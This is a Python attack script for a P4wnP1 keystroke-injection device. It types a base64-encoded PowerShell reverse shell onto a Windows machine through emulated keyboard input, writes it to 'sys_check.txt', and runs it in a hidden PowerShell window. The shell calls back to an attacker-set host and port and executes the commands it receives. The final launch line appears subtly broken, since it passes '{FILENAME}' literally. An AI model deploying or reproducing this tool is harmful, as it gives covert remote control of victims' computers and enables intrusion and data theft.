#!/usr/bin/env python3
import os, sys, time, base64

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

FILENAME = "sys_check.txt"

def generate_payload(lhost, lport):
    payload = rf"""
$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream=$client.GetStream();
$buffer=New-Object Byte[] 65535;
$enc=New-Object Text.ASCIIEncoding;
while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){{
  $data=$enc.GetString($buffer,0,$i);
  $send=(iex $data 2>&1 | Out-String) + 'PS ' + (Get-Location).Path + '> ';
  $sb=$enc.GetBytes($send);
  $stream.Write($sb,0,$sb.Length);
}}
$client.Close();
""".strip()
    return base64.b64encode(payload.encode("utf-16le")).decode()

def send_lines_to_file(b64, line_len=150):
    for i in range(0, len(b64), line_len):
        part = b64[i:i+line_len]
        type_string(f'echo {part} >> {FILENAME}\n')
        time.sleep(0.1)

def main():
    lhost = os.getenv("P4WN_LHOST", "192.168.1.133")
    lport = int(os.getenv("P4WN_LPORT", "4444"))
    print(f"[*] LHOST={lhost} LPORT={lport}")
    b64 = generate_payload(lhost, lport)

    win_r(); time.sleep(0.5)
    type_string("cmd\n"); time.sleep(0.8)
    type_string(f'del {FILENAME} >nul 2>&1\n')
    time.sleep(0.2)
    send_lines_to_file(b64)
    time.sleep(0.2)
    type_string('powershell -nop -w hidden -command "& {Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-Content "{FILENAME}" -Raw))))}"\n')
    print("[*] Reverse shell launched via dropped base64 payload.")

if __name__ == "__main__":
    main()
